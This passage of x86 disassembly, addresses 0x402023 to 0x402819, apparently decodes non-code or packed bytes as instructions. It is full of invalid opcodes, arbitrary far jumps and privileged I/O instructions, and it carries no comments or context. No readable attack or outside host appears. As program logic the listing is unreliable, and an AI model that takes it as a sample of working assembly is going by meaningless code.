  402023:	mov    BYTE PTR [esp+ecx*1],ah
  402026:	lods   al,BYTE PTR ds:[esi]
  402027:	ss ret 0x4d80
  40202b:	shl    DWORD PTR [esi],0xb2
  40202e:	imul   edx,DWORD PTR [esp+eiz*4-0x20],0x3e
  402033:	jmp    0xa2eb97f5
  402038:	push   eax
  402039:	pmuludq mm6,QWORD PTR [edx-0x5f]
  40203d:	popa   
  40203e:	ss xor al,0xa3
  402041:	jecxz  0x4020ac
  402043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402044:	test   eax,0x96a483ba
  402049:	test   al,0x5a
  40204c:	inc    ebp
  40204d:	pop    esp
  40204e:	sub    eax,0x97e6910a
  402053:	xor    bh,0x14
  402056:	dec    esp
  402057:	xchg   esi,eax
  402058:	xchg   BYTE PTR [esp+ecx*2],ch
  40205b:	inc    ecx
  40205c:	ds jmp 0xfe50:0x38b442ca
  402064:	jle    0x4020b2
  402066:	cmp    eax,0xc30bc42
  40206b:	pop    ss
  40206c:	jg     0x402063
  40206e:	imul   ebp,DWORD PTR [edi],0x6e
  402071:	xor    dl,dl
  402073:	add    eax,DWORD PTR [esi]
  402075:	cmp    BYTE PTR [edx],cl
  402077:	dec    DWORD PTR [edi-0x3566de7a]
  40207d:	push   cs
  40207e:	push   ebx
  40207f:	jg     0x4020ed
  402081:	cmc    
  402082:	jp     0x4020a1
  402084:	pop    ebp
  402085:	mov    dh,0x19
  402087:	imul   edx,DWORD PTR [esi-0x6e],0xffffff9c
  40208b:	or     DWORD PTR [ecx-0x42],edi
  40208e:	(bad)  
  40208f:	mov    esp,0x26172405
  402094:	sar    DWORD PTR [ecx-0x1],1
  402097:	pop    ecx
  402098:	mov    ecx,0x56f019a6
  40209d:	push   ebx
  40209e:	test   eax,0x65b865e9
  4020a3:	cmp    DWORD PTR [eax+0x60],0xffffffd6
  4020a7:	inc    si
  4020a9:	mov    eax,edx
  4020ab:	sub    cl,bh
  4020ad:	mov    ss,WORD PTR [bp-0x1e]
  4020b1:	push   edx
  4020b2:	inc    ebx
  4020b3:	mov    WORD PTR [edi+ecx*8-0x273f4537],ds
  4020ba:	push   esi
  4020bb:	stc    
  4020bc:	fisub  WORD PTR [ebp-0x1e958deb]
  4020c2:	inc    eax
  4020c3:	loopne 0x4020ad
  4020c5:	cld    
  4020c6:	add    al,0x1e
  4020c8:	pushf  
  4020c9:	jmp    0xa746:0xf23a32b2
  4020d0:	mov    ?,WORD PTR [ebp+0x19]
  4020d3:	push   esp
  4020d4:	loopne 0x4020bb
  4020d6:	jnp    0x4020ee
  4020d8:	pop    ebp
  4020d9:	jo     0x4020d5
  4020db:	push   ecx
  4020dc:	lods   eax,DWORD PTR ds:[esi]
  4020dd:	sbb    bl,ch
  4020df:	mov    esp,ebp
  4020e1:	cdq    
  4020e2:	sub    cl,bl
  4020e4:	aas    
  4020e5:	or     dl,BYTE PTR [ebx]
  4020e7:	shl    BYTE PTR [ebp+0x1e],cl
  4020ea:	aam    0xab
  4020ec:	adc    eax,0x1e73a023
  4020f1:	and    eax,DWORD PTR [edx-0xc5ba508]
  4020f7:	sub    ebx,esi
  4020f9:	jl     0x40213e
  4020fb:	push   0x45bfcf53
  402100:	pop    edx
  402101:	ret    
  402102:	pop    ss
  402103:	cmp    BYTE PTR [ebx],dh
  402105:	jns    0x402175
  402107:	mul    DWORD PTR [ecx-0x7737b1ae]
  40210d:	pop    ds
  40210e:	dec    esp
  40210f:	sti    
  402110:	and    eax,ecx
  402112:	xor    esi,esp
  402114:	mov    cl,0x2e
  402116:	sbb    eax,0x72de9c00
  40211b:	mov    ds:0x8467faf0,al
  402120:	ins    BYTE PTR es:[edi],dx
  402121:	retf   
  402122:	frstor ds:[ebp-0x69]
  402126:	push   0xffffffa2
  402128:	imul   ebx,DWORD PTR [esi+0x44],0xffffff98
  40212c:	or     edi,DWORD PTR [eax-0x26]
  40212f:	(bad)  
  402130:	cmp    al,0xa1
  402132:	mov    ecx,0xdb2c4ffd
  402137:	mov    eax,esi
  402139:	sub    al,0x95
  40213b:	pop    ds
  40213c:	(bad)  
  40213d:	cmp    esi,DWORD PTR [ebp+0x4d]
  402140:	mov    ch,0xac
  402142:	mov    WORD PTR [esi-0x1f],cs
  402145:	mov    gs,WORD PTR [ecx+0x45ca6e38]
  40214b:	mov    WORD PTR [esi],gs
  40214d:	out    dx,al
  40214e:	out    0xa3,al
  402150:	pop    ebx
  402151:	jmp    0x402106
  402153:	push   0xffffffa9
  402155:	and    esi,esi
  402157:	lods   eax,DWORD PTR ds:[esi]
  402158:	mov    edx,0x5966a923
  40215d:	sbb    al,0xe9
  40215f:	push   ss
  402160:	pop    eax
  402161:	inc    ebx
  402162:	adc    eax,DWORD PTR [edi-0x68]
  402165:	mov    edx,DWORD PTR [edi]
  402167:	jle    0x40219a
  402169:	jp     0x4021be
  40216b:	call   0x39056837
  402170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402171:	call   0xd1f168a4
  402176:	(bad)  
  402177:	xor    eax,0xecb3dbb6
  40217c:	xchg   eax,ecx
  40217e:	inc    ebp
  40217f:	or     DWORD PTR [ecx],eax
  402181:	out    0x62,al
  402183:	push   es
  402184:	adc    dl,al
  402186:	lods   eax,DWORD PTR ds:[esi]
  402187:	xchg   cl,bl
  402189:	iret   
  40218a:	fcmovne st,st(5)
  40218c:	xor    esi,DWORD PTR [ecx-0x7bbedc08]
  402192:	mov    dh,0xf2
  402194:	scas   eax,DWORD PTR es:[edi]
  402195:	loop   0x4021c2
  402197:	call   0xc06c:0xb97673a4
  40219e:	sahf   
  40219f:	mov    eax,ds:0x160ea272
  4021a4:	mov    edx,0x10a02c8f
  4021a9:	or     dh,BYTE PTR [edi-0x247ac1e5]
  4021af:	sti    
  4021b0:	push   edi
  4021b1:	lahf   
  4021b2:	mov    edi,0x18972ee5
  4021b7:	adc    ebp,esp
  4021b9:	or     eax,ebx
  4021bb:	inc    esi
  4021bc:	imul   bl
  4021be:	or     dl,BYTE PTR [ebp-0x29c2c6a8]
  4021c4:	test   eax,0xa570b638
  4021c9:	dec    edi
  4021ca:	pop    eax
  4021cb:	cdq    
  4021cc:	je     0x4021fc
  4021ce:	stc    
  4021cf:	pop    ecx
  4021d0:	cmp    DWORD PTR [ebx+0x10abbe12],ebp
  4021d6:	mul    DWORD PTR [edi]
  4021d8:	xchg   edx,eax
  4021d9:	dec    eax
  4021da:	vpunpcklwd xmm1,xmm1,XMMWORD PTR [edx-0x6f]
  4021df:	xor    BYTE PTR [ebx-0x1879bfd7],bh
  4021e5:	ror    DWORD PTR [edi+0x56],0xca
  4021e9:	sti    
  4021ea:	data16 fistp DWORD PTR [ebp-0x73]
  4021ee:	sub    ch,dl
  4021f0:	inc    edx
  4021f1:	jae    0x402260
  4021f3:	scas   al,BYTE PTR es:[edi]
  4021f4:	mov    DWORD PTR [ebx-0x5e727854],ecx
  4021fa:	stc    
  4021fb:	inc    DWORD PTR [edi+0x73]
  4021fe:	xchg   bl,ch
  402200:	adc    DWORD PTR gs:[esi-0x4a6da6c0],eax
  402207:	gs pop ebx
  402209:	mov    bl,0xb
  40220b:	out    dx,eax
  40220c:	lods   eax,DWORD PTR ds:[esi]
  40220d:	lods   eax,DWORD PTR ds:[esi]
  40220e:	add    bl,BYTE PTR [eax]
  402210:	(bad)  
  402211:	mov    ebx,0xd9ab9362
  402216:	dec    esi
  402217:	stos   DWORD PTR es:[edi],eax
  402218:	cdq    
  402219:	loop   0x4021b9
  40221b:	add    eax,0x2a1c83fa
  402220:	bound  eax,QWORD PTR [esi]
  402222:	mov    eax,0x6e0240a9
  402227:	jb     0x4021c4
  402229:	(bad)  
  40222b:	pop    ebx
  40222c:	pop    esi
  40222d:	dec    esp
  40222e:	cmp    al,0x2
  402230:	sbb    eax,0xe99f5ff6
  402235:	sbb    DWORD PTR [esi+edi*2],edx
  402238:	mov    dh,0xeb
  40223a:	outs   dx,BYTE PTR ds:[esi]
  40223b:	in     al,dx
  40223c:	(bad)  
  40223d:	(bad)  
  40223e:	jbe    0x4021cb
  402240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402241:	stc    
  402242:	cmp    esi,DWORD PTR [eax-0x617edf6]
  402248:	(bad)  
  40224a:	adc    eax,0x2a44ebc7
  40224f:	fs xchg edx,eax
  402251:	pop    ds
  402252:	sbb    DWORD PTR [ebp+0x22],ebp
  402255:	dec    edi
  402256:	mov    BYTE PTR ss:[edx+0x61],bl
  40225a:	jle    0x40225b
  40225c:	pop    esi
  40225d:	(bad)  
  40225e:	sbb    BYTE PTR [esi-0x682bca02],ch
  402264:	in     al,dx
  402265:	inc    edx
  402266:	add    al,0xda
  402268:	or     dh,ah
  40226a:	mov    ah,0xee
  40226c:	mov    ah,0x5f
  40226e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40226f:	xor    DWORD PTR [ebp+0x24],ebx
  402272:	xor    bl,BYTE PTR [esi-0x44]
  402275:	out    0x83,al
  402277:	out    0x73,eax
  402279:	in     eax,0x27
  40227b:	mov    ecx,0xf71b84c9
  402280:	std    
  402281:	into   
  402282:	es cdq 
  402284:	(bad)  
  402285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402286:	aam    0x9
  402288:	mov    bh,0x94
  40228a:	push   ds
  40228b:	xor    eax,0xcc028e44
  402290:	test   BYTE PTR [ebp+0x1c],cl
  402293:	bound  ebx,QWORD PTR [esi+esi*8+0x5cb97e7c]
  40229a:	push   0xffffffd9
  40229c:	adc    edx,ebp
  40229e:	aas    
  40229f:	xor    ch,BYTE PTR [ebx+0x1739b5b1]
  4022a5:	sub    al,BYTE PTR [edx+0x24]
  4022a8:	ins    BYTE PTR es:[edi],dx
  4022a9:	fnstsw WORD PTR [esi]
  4022ab:	fcomip st,st(2)
  4022ad:	enter  0xa874,0x2b
  4022b1:	xor    al,0x29
  4022b3:	sub    DWORD PTR [edx-0x14589aef],esi
  4022b9:	add    DWORD PTR [ebp+0x249421c4],eax
  4022bf:	xlat   BYTE PTR ds:[ebx]
  4022c0:	rol    BYTE PTR [edx+0x27],cl
  4022c3:	push   0xffffffa6
  4022c5:	call   0xd086:0x4fd97182
  4022cc:	(bad)  
  4022cd:	sbb    al,0x92
  4022cf:	pop    edx
  4022d0:	addr16 push 0xffffff95
  4022d3:	popf   
  4022d4:	out    dx,eax
  4022d5:	or     al,0xe3
  4022d7:	pop    ebx
  4022d8:	mov    edi,0x6d811bd0
  4022dd:	idiv   DWORD PTR [ebx]
  4022df:	retf   0x4f3c
  4022e2:	(bad)  
  4022e3:	popa   
  4022e4:	mov    edx,0x932730ca
  4022e9:	inc    esi
  4022ea:	sub    ebp,ecx
  4022ec:	lock xor ebx,ebp
  4022ef:	add    al,0x45
  4022f1:	mov    edi,DWORD PTR [ebx]
  4022f3:	cli    
  4022f4:	lock jmp FWORD PTR [edi+0x5296b52b]
  4022fb:	(bad)  
  4022fc:	std    
  4022fd:	xchg   ebx,eax
  4022fe:	push   0xe2dec8eb
  402303:	push   ss
  402304:	mov    edx,0xaf54a1df
  402309:	repnz outs dx,BYTE PTR ds:[esi]
  40230b:	pop    esi
  40230c:	div    dl
  40230e:	imul   ebp,DWORD PTR [ecx+ecx*2],0x3a
  402312:	mov    dh,0x91
  402314:	sar    DWORD PTR [eax+0x3d],1
  402317:	mov    WORD PTR [esi],?
  402319:	push   cs
  40231a:	xor    esp,DWORD PTR [eax+0x4330e57f]
  402320:	sub    eax,0xf70137ab
  402325:	aaa    
  402326:	(bad)  
  402327:	fldenv [edx-0x5a]
  40232a:	jo     0x402391
  40232c:	sbb    DWORD PTR [edx+0x4a],ecx
  40232f:	ret    0x894e
  402332:	cmp    DWORD PTR [ecx],ebx
  402334:	sub    eax,0xb4fd5ec4
  402339:	and    bh,BYTE PTR [ebp+0x27]
  40233c:	inc    eax
  40233d:	cli    
  40233e:	cmp    ebx,DWORD PTR [esi]
  402340:	pop    edi
  402341:	xchg   cl,dh
  402343:	push   edi
  402344:	add    al,0x42
  402346:	push   edx
  402347:	mov    al,ds:0x231fc613
  40234c:	mov    dl,0xd4
  40234e:	pop    ss
  40234f:	setle  BYTE PTR [ebx-0x137163ef]
  402356:	mov    dh,0x7e
  402358:	in     eax,0xd9
  40235a:	push   esp
  40235b:	enter  0x88ef,0xf4
  40235f:	and    BYTE PTR [ebp+0x22],bh
  402362:	or     DWORD PTR [esi-0x76],edi
  402365:	xor    DWORD PTR ds:0x989e2c48,esi
  40236b:	repnz arpl di,bx
  40236e:	retf   0x2ef6
  402371:	sub    edx,esi
  402373:	xor    eax,0xf24ea9bd
  402378:	xchg   esi,eax
  402379:	jne    0x4023cc
  40237b:	lods   eax,DWORD PTR ds:[esi]
  40237c:	push   edi
  40237d:	jge    0x40236e
  40237f:	(bad)  [esi+ebp*4+0x59]
  402383:	pushf  
  402384:	ins    DWORD PTR es:[edi],dx
  402385:	mov    bl,0xd3
  402387:	ja     0x402347
  402389:	mov    eax,ds
  40238b:	xchg   ebx,eax
  40238c:	in     al,dx
  40238d:	adc    ah,BYTE PTR [ecx-0x54]
  402390:	jle    0x4023e2
  402392:	adc    DWORD PTR [ebx],edx
  402394:	bound  edx,QWORD PTR [ecx-0x80]
  402397:	ja     0x4023e3
  402399:	fisubr WORD PTR [esi+0x69]
  40239c:	and    BYTE PTR [edi],0x8b
  40239f:	push   edx
  4023a0:	int    0x9b
  4023a2:	out    0xd8,eax
  4023a4:	mov    ecx,0xc387461c
  4023a9:	sub    al,0x72
  4023ab:	add    eax,0xafdd5e8a
  4023b0:	sub    BYTE PTR [ebx-0x30],ah
  4023b3:	in     eax,dx
  4023b4:	test   al,0x41
  4023b6:	xchg   BYTE PTR [edi+0x2b266322],bl
  4023bc:	push   0xdf3b6d62
  4023c1:	add    BYTE PTR [eax-0xd],bh
  4023c4:	lds    edx,FWORD PTR [ecx+0x60]
  4023c7:	fld    TBYTE PTR [eax+0x33]
  4023ca:	(bad)  
  4023cc:	fs fdivr st,st(3)
  4023cf:	mov    eax,edi
  4023d1:	ror    BYTE PTR [ebx+0x2e],1
  4023d4:	out    0x17,al
  4023d6:	mov    esi,0xa20cc7c4
  4023db:	pop    edx
  4023dc:	sub    cl,0x64
  4023df:	lods   eax,DWORD PTR ds:[esi]
  4023e0:	inc    edi
  4023e1:	mov    ebx,0x4c95a1ad
  4023e6:	mov    dh,0xdf
  4023e8:	add    al,0x64
  4023ea:	xchg   BYTE PTR [edi+0x64],dh
  4023ed:	push   ebp
  4023ee:	(bad)  
  4023ef:	mov    ebp,0x66a88f93
  4023f4:	and    BYTE PTR [edi+0x544225ab],cl
  4023fa:	(bad)  
  4023fb:	daa    
  4023fc:	adc    eax,0x9c863be8
  402401:	cwde   
  402402:	add    eax,0x6ea2c0f6
  402407:	pop    esp
  402408:	iret   
  402409:	leave  
  40240a:	cwde   
  40240b:	(bad)  
  40240c:	mov    ah,0xd8
  40240e:	ja     0x4023b5
  402410:	mov    al,ds:0xb2026396
  402415:	jecxz  0x402410
  402417:	gs mov al,0x4
  40241a:	retf   0x4521
  40241d:	icebp  
  40241e:	mov    eax,0x64c34696
  402423:	stos   BYTE PTR es:[edi],al
  402424:	fdivr  DWORD PTR [eax+ebp*8]
  402427:	pushf  
  402428:	xchg   ebp,eax
  402429:	int    0x29
  40242b:	and    al,0x79
  40242d:	repz ficom DWORD PTR [edi+0x1c]
  402431:	cld    
  402432:	push   esp
  402433:	clc    
  402434:	push   0x2c
  402436:	jmp    0xcf0b:0xe53f4461
  40243d:	icebp  
  40243e:	cmp    dl,BYTE PTR [ecx-0x11fd66b0]
  402444:	out    0xc1,al
  402446:	or     al,BYTE PTR [ecx-0xd]
  402449:	jb     0x4024b7
  40244b:	test   eax,0x47e7fbf0
  402450:	out    0x6b,al
  402452:	retf   
  402453:	add    esp,0x76026571
  402459:	sbb    bl,BYTE PTR [edx-0x1625d31e]
  40245f:	js     0x40249f
  402461:	dec    ebx
  402462:	cwde   
  402463:	pop    ebp
  402464:	mov    DWORD PTR [esi+0xbf8db7],ecx
  40246a:	push   esi
  40246b:	rol    BYTE PTR ds:0xf08d67fd,0x36
  402472:	sub    DWORD PTR [eax+eax*2+0x4c603641],ebx
  402479:	cmp    dh,BYTE PTR [ebp-0x7f]
  40247c:	fsubp  st(3),st
  40247e:	out    0xf7,al
  402480:	add    esi,DWORD PTR cs:[ebp+0x6b]
  402484:	(bad)  
  402486:	inc    esp
  402487:	loopne 0x40240d
  402489:	xor    DWORD PTR [esi],esp
  40248b:	jecxz  0x4024ed
  40248d:	lock mov eax,0xcb21c23b
  402493:	loope  0x402476
  402495:	aas    
  402496:	cs (bad) 
  402499:	popa   
  40249a:	pop    esp
  40249b:	stc    
  40249c:	sub    ch,BYTE PTR [esi-0x25]
  40249f:	fcomp  QWORD PTR [ebp+0xfb791ea]
  4024a5:	sub    al,0xe3
  4024a7:	push   esp
  4024a8:	clc    
  4024a9:	push   0x743834ed
  4024ae:	push   es
  4024af:	jp     0x4024d7
  4024b1:	out    0x20,eax
  4024b3:	into   
  4024b4:	sti    
  4024b5:	stc    
  4024b6:	jle    0x4024e8
  4024b8:	adc    edi,ecx
  4024ba:	sub    edx,DWORD PTR [edi+0x65]
  4024bd:	add    bl,BYTE PTR [eax-0x46]
  4024c0:	adc    al,0x6
  4024c2:	ja     0x4024ec
  4024c4:	ins    BYTE PTR es:[edi],dx
  4024c5:	cmp    BYTE PTR [ecx],ah
  4024c7:	fst    DWORD PTR [eax+esi*4]
  4024ca:	pop    edx
  4024cb:	cmp    esp,ebp
  4024cd:	dec    edx
  4024ce:	mov    dl,0xbf
  4024d0:	push   es
  4024d1:	dec    BYTE PTR [ebx+0x70]
  4024d4:	xchg   esi,eax
  4024d5:	xchg   esp,eax
  4024d6:	push   esi
  4024d7:	cmp    al,BYTE PTR [edx+0x5a]
  4024da:	and    edx,DWORD PTR [edi]
  4024dc:	jne    0x4024ff
  4024de:	(bad)  
  4024df:	mov    edi,DWORD PTR [esi]
  4024e1:	jne    0x4024b9
  4024e3:	mov    edi,0xf895bec3
  4024e8:	inc    ebx
  4024e9:	or     BYTE PTR [edi+0x61],0x34
  4024ed:	int    0x14
  4024ef:	push   ss
  4024f0:	test   DWORD PTR [ecx],eax
  4024f2:	mov    ds:0x3d801a95,al
  4024f7:	xchg   esp,edx
  4024f9:	sub    eax,0x3df41351
  4024fe:	gs retf 
  402500:	cmp    ch,BYTE PTR [ebx-0x476bfc8b]
  402506:	nop
  402507:	add    esi,edi
  402509:	inc    ebx
  40250a:	jo     0x4024e1
  40250c:	out    0xf6,eax
  40250e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40250f:	mov    al,0xc2
  402511:	icebp  
  402512:	mov    edi,edx
  402514:	arpl   WORD PTR [ebx+ecx*4-0x60079fd5],ax
  40251b:	mov    edx,0x92778183
  402520:	test   DWORD PTR [edi+0x14dc021],eax
  402526:	dec    ebp
  402527:	mov    eax,ds:0x311653ca
  40252c:	mov    al,ds:0xaaa46881
  402531:	xor    bl,dl
  402533:	jne    0x4024c4
  402535:	mov    BYTE PTR [ecx],bl
  402537:	pop    es
  402538:	repz call 0x96fb4da0
  40253e:	xor    al,0xb0
  402540:	add    DWORD PTR [esi-0x5d23746a],ebp
  402546:	call   0x730b84bc
  40254b:	ins    BYTE PTR es:[edi],dx
  40254c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40254d:	xor    DWORD PTR [ecx],ebx
  40254f:	data16 out 0xf1,al
  402552:	mov    bh,BYTE PTR [ecx+ebp*8+0x26]
  402556:	stos   DWORD PTR es:[edi],eax
  402557:	dec    ecx
  402558:	push   cs
  402559:	(bad)  
  40255a:	(bad)  
  40255b:	pusha  
  40255c:	std    
  40255d:	ffreep st(3)
  40255f:	or     DWORD PTR [ecx+0x3c],ebp
  402562:	mov    ch,0xc2
  402564:	mov    al,ds:0xb2446dee
  402569:	in     eax,dx
  40256a:	sbb    edx,DWORD PTR ds:0x337c711a
  402570:	adc    edx,DWORD PTR [eax-0x395672b7]
  402576:	clc    
  402577:	sbb    eax,0x562f8149
  40257c:	jno    0x40255d
  40257e:	enter  0x156b,0x35
  402582:	leave  
  402583:	and    BYTE PTR ds:0x177bcb02,cl
  402589:	lods   eax,DWORD PTR ds:[esi]
  40258a:	(bad)
  40258d:	scas   al,BYTE PTR es:[edi]
  40258e:	xchg   edi,eax
  40258f:	mov    dl,0xc
  402591:	and    edx,0xd42d3df3
  402597:	btc    edx,0x4f
  40259b:	xchg   BYTE PTR [ebx-0x79],bl
  40259e:	xor    edx,DWORD PTR ds:0x376e35dc
  4025a4:	imul   ecx,edi,0x52
  4025a7:	jp     0x4025ac
  4025a9:	push   0x2cc8c108
  4025ae:	or     al,bh
  4025b0:	jg     0x402544
  4025b2:	cmp    eax,0x4360e431
  4025b7:	pusha  
  4025b8:	adc    ecx,DWORD PTR [edx]
  4025ba:	sbb    eax,DWORD PTR [esi]
  4025bc:	std    
  4025bd:	jno    0x40256f
  4025bf:	cli    
  4025c0:	into   
  4025c1:	daa    
  4025c2:	or     dh,BYTE PTR [edx]
  4025c4:	inc    edi
  4025c5:	rcl    BYTE PTR [eax],1
  4025c7:	pop    ds
  4025c8:	jbe    0x4025e1
  4025ca:	pop    es
  4025cb:	mov    dh,0xdc
  4025cd:	mov    ebx,0xa8669733
  4025d2:	repnz pop edi
  4025d4:	and    eax,0xe83b7ff
  4025d9:	push   es
  4025da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025db:	mov    al,ds:0xd5aa4e2
  4025e0:	mov    BYTE PTR [ebp+edx*1-0x32d61e74],ah
  4025e7:	mov    eax,0xcc44410
  4025ec:	jp     0x402575
  4025ee:	call   0x4669fc16
  4025f3:	and    DWORD PTR [eax+0x5a72d090],ecx
  4025f9:	push   ecx
  4025fa:	(bad)  
  4025fb:	sbb    al,0xc6
  4025fd:	in     al,0x72
  4025ff:	sbb    eax,0x645cfe9d
  402604:	mov    ebx,0x335add90
  402609:	xor    edx,ebp
  40260b:	mov    dh,0x75
  40260d:	repz dec eax
  40260f:	in     eax,0xa0
  402611:	outs   dx,BYTE PTR ds:[esi]
  402612:	fcom   DWORD PTR [esi+0x76]
  402615:	ins    BYTE PTR es:[edi],dx
  402616:	into   
  402617:	mov    dh,0xad
  402619:	jbe    0x4025e5
  40261b:	stos   BYTE PTR es:[edi],al
  40261c:	cmp    eax,0x42f4908c
  402621:	dec    edx
  402622:	jmp    0xb2cd:0xa6d86907
  402629:	dec    esi
  40262a:	mov    esi,0xd5020b1b
  40262f:	scas   eax,DWORD PTR es:[edi]
  402630:	mov    edx,DWORD PTR [esi-0x1d]
  402633:	imul   eax,ecx,0x45cd7f99
  402639:	mov    edi,0x578e0b7c
  40263e:	(bad)
  402642:	push   esi
  402643:	in     al,0x98
  402645:	push   ds
  402646:	xchg   ebp,eax
  402647:	xchg   esp,eax
  402648:	push   esi
  402649:	push   ebx
  40264a:	mov    ds:0xfe302ff8,eax
  40264f:	jl     0x402605
  402651:	adc    ch,bl
  402653:	aam    0x78
  402655:	push   ebx
  402656:	aaa    
  402657:	cmp    al,0x0
  402659:	xchg   DWORD PTR [ebp+0x14],esp
  40265c:	inc    edx
  40265d:	sbb    dl,ch
  40265f:	idiv   BYTE PTR [edx]
  402661:	xchg   edx,eax
  402662:	push   edx
  402663:	(bad)  
  402664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402665:	std    
  402666:	scas   al,BYTE PTR es:[edi]
  402667:	out    0x3,al
  402669:	in     al,dx
  40266a:	cmp    BYTE PTR [edi+0x76e159ea],al
  402670:	imul   ebx,eax,0x43ea0e2b
  402676:	xchg   edi,eax
  402677:	les    cx,DWORD PTR [ebx+eax*1]
  40267b:	cs in  eax,dx
  40267d:	ficom  DWORD PTR ds:0xb6483c3
  402683:	pop    es
  402684:	imul   ebx,DWORD PTR [ebx-0x68137cd3],0xd52d0d2e
  40268e:	(bad)  
  40268f:	(bad)  
  402690:	test   al,0x8c
  402692:	ret    
  402693:	inc    esi
  402694:	jg     0x4026db
  402696:	push   ss
  402697:	pop    esi
  402698:	fnstenv [esi+0x318e0684]
  40269e:	xchg   edi,eax
  40269f:	xor    dl,BYTE PTR [ebx-0x368ac2f6]
  4026a5:	es arpl bx,bp
  4026a8:	mov    BYTE PTR [edi-0x6d543e32],ch
  4026ae:	sbb    bl,BYTE PTR [ebx+0x25da64a5]
  4026b4:	adc    eax,0xa24fd881
  4026b9:	ror    BYTE PTR ds:0x6f6fd31d,1
  4026bf:	js     0x40264c
  4026c1:	in     eax,dx
  4026c2:	push   ebp
  4026c3:	in     eax,0x19
  4026c5:	sub    DWORD PTR [esi],edx
  4026c7:	je     0x402697
  4026c9:	jp     0x4026ef
  4026cb:	xchg   BYTE PTR [edx-0xf],dl
  4026ce:	test   al,0x74
  4026d0:	inc    edi
  4026d1:	inc    esp
  4026d2:	dec    ebx
  4026d3:	sub    esi,DWORD PTR [edx-0x5075fd47]
  4026d9:	fcomip st,st(6)
  4026db:	push   ds
  4026dc:	dec    ebx
  4026dd:	leave  
  4026de:	leave  
  4026df:	add    DWORD PTR [si-0x4c],edx
  4026e3:	sub    eax,0xf5b01f3a
  4026e8:	and    al,cl
  4026ea:	sub    bh,BYTE PTR [edx-0x6761ed69]
  4026f0:	je     0x402762
  4026f2:	cli    
  4026f3:	pop    edx
  4026f4:	jmp    0x40274b
  4026f6:	dec    esp
  4026f7:	in     eax,0xc7
  4026f9:	jl     0x402726
  4026fb:	cdq    
  4026fc:	(bad)  
  4026fd:	mov    ecx,0x3562906e
  402702:	adc    DWORD PTR [ebx-0x19],0x4ab0b88
  402709:	leave  
  40270a:	aad    0x9c
  40270c:	jmp    0x394ac38a
  402711:	pop    si
  402713:	clc    
  402714:	in     al,dx
  402715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402716:	aas    
  402717:	std    
  402718:	xchg   BYTE PTR [eax-0x5f],dh
  40271b:	mov    esi,0x834c0f62
  402720:	jae    0x4026fc
  402722:	out    0x83,eax
  402724:	xor    al,0x2c
  402726:	jb     0x4026b5
  402728:	push   edi
  402729:	inc    esi
  40272a:	pop    es
  40272b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40272c:	movups xmm4,XMMWORD PTR [ebp+0x2b]
  402730:	hlt    
  402731:	rcr    DWORD PTR [edi+esi*1-0x6c],cl
  402735:	xchg   ebp,eax
  402736:	dec    ebp
  402737:	stos   DWORD PTR es:[edi],eax
  402738:	mov    bl,0x46
  40273a:	retf   0x84b5
  40273d:	add    al,0xa6
  40273f:	lahf   
  402740:	fstp   DWORD PTR [edx+0x4c]
  402743:	sahf   
  402744:	dec    edi
  402745:	bnd js 0x402718
  402748:	sbb    al,0x3f
  40274a:	push   edx
  40274b:	xchg   edx,eax
  40274c:	xchg   ebx,eax
  40274d:	dec    eax
  40274e:	outs   dx,DWORD PTR ds:[esi]
  40274f:	das    
  402750:	je     0x40277e
  402752:	mov    edi,0x2df3d2e3
  402757:	xor    bh,BYTE PTR [ebx-0x3b43be31]
  40275d:	mov    edi,0xac6d3516
  402762:	pop    edx
  402763:	cmp    DWORD PTR [ebx+0x4195dcea],eax
  402769:	jmp    0x67758dd9
  40276e:	test   eax,0x866a5ad0
  402773:	sbb    cl,BYTE PTR [edi+0x6c]
  402776:	adc    edi,edi
  402778:	cld    
  402779:	arpl   WORD PTR [esi-0x235299d5],sp
  40277f:	cli    
  402780:	sub    DWORD PTR [edi+0x58],0xc
  402784:	sti    
  402785:	int    0x5b
  402787:	add    eax,0x24bcd8b4
  40278c:	shl    DWORD PTR [edx-0x9],1
  40278f:	cmc    
  402790:	loope  0x402784
  402792:	iret   
  402793:	loope  0x4027c1
  402795:	push   esi
  402796:	jne    0x4027de
  402798:	xlat   BYTE PTR ds:[ebx]
  402799:	jae    0x4027aa
  40279b:	repnz sbb al,ah
  40279e:	clc    
  40279f:	fs pop ebp
  4027a1:	xchg   edx,eax
  4027a2:	mov    ch,0xc3
  4027a4:	in     al,0x47
  4027a6:	mov    eax,0x35187c83
  4027ab:	mov    ch,0x2c
  4027ad:	or     al,0x57
  4027af:	jg     0x4027e6
  4027b1:	sar    BYTE PTR ds:0x756d00be,0x4b
  4027b8:	or     eax,0x515fea5
  4027bd:	pop    es
  4027be:	imul   ecx,DWORD PTR es:0x94a31995,0x4
  4027c6:	and    ch,BYTE PTR [edi+0x217cef67]
  4027cc:	jns    0x4027b5
  4027ce:	in     eax,0x45
  4027d0:	in     eax,0xb8
  4027d2:	fbld   TBYTE PTR [edx]
  4027d4:	(bad)  [edx-0x16a55681]
  4027da:	lock (bad) 
  4027dc:	daa    
  4027dd:	ins    BYTE PTR es:[edi],dx
  4027de:	pop    esp
  4027df:	outs   dx,DWORD PTR es:[esi]
  4027e1:	or     bh,0x4a
  4027e4:	lods   al,BYTE PTR ds:[esi]
  4027e5:	mov    cl,0x2a
  4027e7:	xor    al,0x2f
  4027e9:	cwde   
  4027ea:	dec    esp
  4027eb:	idiv   DWORD PTR ds:0x8cff
  4027f0:	or     esi,DWORD PTR [edx+edx*1]
  4027f3:	test   eax,0xf8e03b51
  4027f8:	clc    
  4027f9:	lock test ch,bl
  4027fc:	push   esp
  4027fd:	or     BYTE PTR [ebx+0x12],0x43
  402801:	and    dh,BYTE PTR [ebp+0x57d97b3e]
  402807:	push   0xefad8188
  40280c:	xchg   esi,eax
  40280d:	sbb    esp,DWORD PTR [esi]
  40280f:	repnz call 0x6a5f:0xb3e00c0b
  402817:	adc    al,0x7c
  402819:	shl    DWORD PTR [ebx-0x4c],cl
